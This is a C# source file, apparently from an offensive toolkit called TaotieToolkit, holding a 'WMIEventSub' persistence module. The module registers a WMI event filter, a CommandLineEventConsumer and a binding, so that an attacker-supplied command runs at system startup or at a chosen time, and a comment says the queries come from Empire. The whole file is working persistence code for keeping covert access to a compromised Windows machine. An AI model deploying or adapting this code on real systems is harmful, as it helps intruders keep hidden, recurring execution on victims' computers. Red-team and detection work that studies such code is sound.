using ArgParseCS;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;
using TaotieToolkit.config;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TaskbarClock;

namespace TaotieToolkit.modules.Persistence
{
    internal class WMIEventSub : ICommand, ICommandMarker
    {
        public string Name => "WMIEventSub";
        public string Description => "WMI event subscription peristence.";
        private ArgParse argParse;
        private void DefineParams()
        {
            argParse = new ArgParse {
                new OptionSet("Autorun") {
                    new Option("-n", "--eventName", "Event Name", true, true),
                    new Option("-c", "--command", "Executable file path", true, true),
                    new Option("-a", "--attime", "Time, default 10:00 or startup", false, true),
                },
            };
        }
        
        public void Execute(string[] args)
        {
            DefineParams();
            if (args.Length == 0)
            {
                argParse.Usage();
                return;
            }
            try
            {
                argParse.Parse(args);
                OptionSet activeOptionSet = argParse.GetActiveOptionSet();

                Option option = activeOptionSet.GetOption("-n");
                string eventName = option.ParamValue;
                option = activeOptionSet.GetOption("-c");
                string command = option.ParamValue;
                option = activeOptionSet.GetOption("-a");
                string attime = option.ParamValue;
                string qu = "";
                //Queries from Empire - need to update
                if (attime.ToLower() == "startup")
                {
                    qu = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
                }
                else if (attime.Contains(":"))
                {
                    string[] mins = attime.Split(':');
                    qu = String.Format("SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = \"{0}\" AND TargetInstance.Minute = \"{1}\" GROUP WITHIN 60", mins[0], mins[1]);
                }
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");

                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                WqlEventQuery myEventQuery = new WqlEventQuery(qu);
                ManagementObject myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = eventName;
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                try
                {
                    Console.WriteLine("[+] Setting '{0}' event filter", eventName);
                    myEventFilter.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Exception in setting event filter: {0}", ex.Message);
                }

                ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();

                myEventConsumer["Name"] = eventName;
                myEventConsumer["CommandLineTemplate"] = command;
                myEventConsumer["RunInteractively"] = false;

                try
                {
                    Console.WriteLine("[+] Setting '{0}' event consumer", eventName);
                    myEventConsumer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Exception in setting event consumer: {0}", ex.Message);
                }

                ManagementObject myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                try
                {
                    Console.WriteLine("[+] Binding '{0}' event filter and consumer", eventName);
                    myBinder.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Exception in setting FilterToConsumerBinding: {0}", ex.Message);
                }
                Console.WriteLine("[+] WMI Subscription {0} has been created to run at {1}", eventName, attime);
            }
            catch (Exception exception)
            {
                // User control the exception
                System.Console.WriteLine("exception: " + exception.Message);
            }

        }
    }
}
